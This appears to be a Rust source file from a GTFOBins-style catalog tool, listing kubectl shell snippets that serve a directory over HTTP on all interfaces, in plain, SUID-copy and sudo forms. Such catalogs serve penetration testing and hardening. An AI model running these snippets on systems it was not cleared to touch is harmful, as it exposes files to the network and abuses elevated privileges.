pub static BIN_NAME: &'static str = "kubectl";
pub static BIN_DESC: &'static str =
    "It serves files from a specific directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.";
pub static FU_CODE: &'static str = r#"
    
    LFILE=dir_to_serve
    kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which kubectl) .

    LFILE=dir_to_serve
    ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=dir_to_serve
    sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
